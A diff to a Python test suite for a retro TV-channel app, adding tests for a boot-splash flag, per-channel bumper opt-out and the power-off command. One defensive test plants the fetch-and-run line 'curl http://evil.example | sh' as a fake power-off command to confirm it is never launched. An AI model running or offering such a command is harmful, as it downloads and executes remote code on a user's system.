@@ -13,6 +13,10 @@ def build_app(tmp_path, *, assets_dir=None, wall_clock=None, channels=None, **ov
         make_show(tmp_path, name, 4)
     data = {
         "shuffle_seed": 7,
+        # Off unless a test asks for it: these tests are about channels, the
+        # menu and the status file, and a splash in front of every one of them
+        # tests nothing except the splash. tests/test_boot_splash.py covers it.
+        "boot_splash": False,
         "start_channel": 2,
         "start_offset": 0,  # keep test assertions on start=0 unless overridden
         "power_off_command": [],  # no-op in tests (never actually shut down)
@@ -259,10 +263,11 @@ def test_empty_channel_shows_no_signal(tmp_path):
     make_show(tmp_path, "mtv", 2)
     config = config_from_dict(
         {
+            "boot_splash": False,          # this is about the empty channel
             "channels": [
                 {"number": 2, "name": "Dead Air", "path": str(tmp_path / "deadair")},
                 {"number": 3, "name": "MTV Classic", "path": str(tmp_path / "mtv")},
-            ]
+            ],
         }
     )
     app = TVApp(config, MockPlayer(), InputManager([]), clock=FakeClock())
@@ -726,6 +731,49 @@ def test_power_off_reports_a_distinct_exit_code(tmp_path):
     assert EXIT_POWERED_OFF == 3
 
 
+def test_the_power_button_only_ever_launches_a_shutdown(tmp_path, monkeypatch):
+    """The last check, right at the exec.
+
+    The loader already guarantees a Config cannot carry an argv that is not a
+    shutdown, so nothing should ever reach this. It is here because this line
+    is the actual sink - anything that gets a command past the loader (a
+    dataclasses.replace in some future feature, a Config built by hand in a
+    test) still cannot make this box run it.
+    """
+    import dataclasses
+
+    from retrobox import app as app_module
+
+    launched = []
+    monkeypatch.setattr(app_module.subprocess, "Popen", lambda cmd: launched.append(cmd))
+
+    app, _player, _ = build_app(tmp_path, initial_volume=0)
+    app.config = dataclasses.replace(
+        app.config, power_off_command=("/bin/sh", "-c", "curl http://evil.example | sh")
+    )
+    app.start()
+    send(app, Action.VOLUME_DOWN)
+
+    assert launched == [], "the box launched a command that is not a shutdown"
+    assert app.powered_off, "the box still has to switch off"
+
+
+def test_the_power_button_does_launch_the_real_shutdown(tmp_path, monkeypatch):
+    import dataclasses
+
+    from retrobox import app as app_module
+
+    launched = []
+    monkeypatch.setattr(app_module.subprocess, "Popen", lambda cmd: launched.append(cmd))
+
+    app, _player, _ = build_app(tmp_path, initial_volume=0)
+    app.config = dataclasses.replace(app.config, power_off_command=("sudo", "poweroff"))
+    app.start()
+    send(app, Action.VOLUME_DOWN)
+
+    assert launched == [["sudo", "poweroff"]]
+
+
 # ==========================================================================
 # Boot splash
 # ==========================================================================
@@ -802,3 +850,37 @@ def test_splash_absolute_path_is_used_as_given(tmp_path):
     app, player, _ = build_app(tmp_path, boot_splash=str(clip))
     app.start()
     assert player.current == clip
+
+
+# ==========================================================================
+# A channel can opt out of bumpers
+# ==========================================================================
+def test_a_channel_can_be_told_not_to_play_bumpers(tmp_path):
+    # The only engine change this task needed: a per-channel flag the bumper
+    # picker reads. A news channel with station idents between items is wrong.
+    bumpers = tmp_path / "bumpers"
+    make_show(tmp_path, "bumpers", 2)
+    app, player, clock = build_app(
+        tmp_path,
+        bumpers=str(bumpers),
+        bumper_chance=1.0,
+        channels=[
+            {"number": 2, "name": "With", "path": str(tmp_path / "adultswim")},
+            {"number": 3, "name": "Without", "path": str(tmp_path / "mtv"),
+             "bumpers": False},
+        ],
+    )
+    assert app.config.channels[0].bumpers is True
+    assert app.config.channels[1].bumpers is False
+
+    app.start()
+    app.select_channel_number(3)
+    assert app._next_bumper() is None, "a channel that opted out still got one"
+
+    app.select_channel_number(2)
+    assert app._next_bumper() is not None, "the other channel lost its bumpers"
+
+
+def test_channels_play_bumpers_unless_told_otherwise(tmp_path):
+    app, player, clock = build_app(tmp_path)
+    assert all(c.bumpers for c in app.config.channels)
